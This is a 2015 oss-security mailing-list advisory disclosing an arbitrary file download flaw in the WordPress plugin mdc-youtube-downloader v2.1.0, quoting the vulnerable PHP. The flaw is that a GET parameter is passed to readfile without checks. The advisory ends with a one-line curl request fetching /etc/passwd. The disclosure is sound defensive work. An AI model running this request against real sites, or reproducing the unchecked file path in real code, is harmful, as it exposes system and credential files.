X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1974" "Monday" "6" "July" "2015" "21:15:42" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<0E2AF306-9C75-415A-B4C8-C9E64C7E136A@me.com>" "51" "[oss-security] Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0" nil nil nil "7" "2015070701:15:42" "[oss-security] Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0" (number mark "U       larry0@me.co Jul  6   51/1974  " thread-indent "\"[oss-security] Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28159 invoked by uid 550); 7 Jul 2015 01:16:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28122 invoked from network); 7 Jul 2015 01:15:55 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-07_01:2015-07-06,2015-07-06,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507070020
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Date: Mon, 06 Jul 2015 21:15:42 -0400
Message-id: <0E2AF306-9C75-415A-B4C8-C9E64C7E136A@me.com>
Cc: fulldisclosure@seclists.org
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1.0

Title: Remote file download in Wordpress Plugin mdc-youtube-downloader v2.1=
.0
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-01
Download Site: https://wordpress.org/plugins/mdc-youtube-downloader
Vendor: https://profiles.wordpress.org/mukto90/
Vendor Notified: 2015-07-01, removed vulnerable code.
Vendor Contact: n.mukto@gmail.com
Description: MDC YouTube Downloader allows visitors to download YouTube vid=
eos directly from your WordPress site.
Vulnerability:
The code in mdc-youtube-downloader/includes/download.php doesn't restrict a=
ccess to the local file system allowing sensitive files to be
downloaded:

$file_name =3D $_GET['file'];

// make sure it's a file before doing anything!
if(is_file($file_name)) {
=2E
=2E
=2E
 switch(strtolower(substr(strrchr($file_name, '.'), 1))) {
                case 'pdf': $mime =3D 'application/pdf'; break;
                case 'zip': $mime =3D 'application/zip'; break;
                case 'jpeg':
                case 'jpg': $mime =3D 'image/jpg'; break;
                default: $mime =3D 'application/force-download';
        }
        header('Pragma: public');       // required
        header('Expires: 0');           // no cache
        header('Cache-Control: must-revalidate, post-check=3D0, pre-check=
=3D0');
        header('Last-Modified: '.gmdate ('D, d M Y H:i:s', filemtime ($file=
_name)).' GMT');
        header('Cache-Control: private',false);
        header('Content-Type: '.$mime);
        header('Content-Disposition: attachment; filename=3D"'.basename($fi=
le_name).'"');
        header('Content-Transfer-Encoding: binary');
        header('Content-Length: '.filesize($file_name));        // provide =
file size
        header('Connection: close');
        readfile($file_name);           // push it out
        exit();

CVEID: Requested, TBD.
OSVDB: TBD.
Exploit Code:
	=E2=80=A2 $ curl http://www.example.com/wp-content/plugins/mdc-youtube-dow=
nloader/includes/download.php?file=3D/etc/passwd=
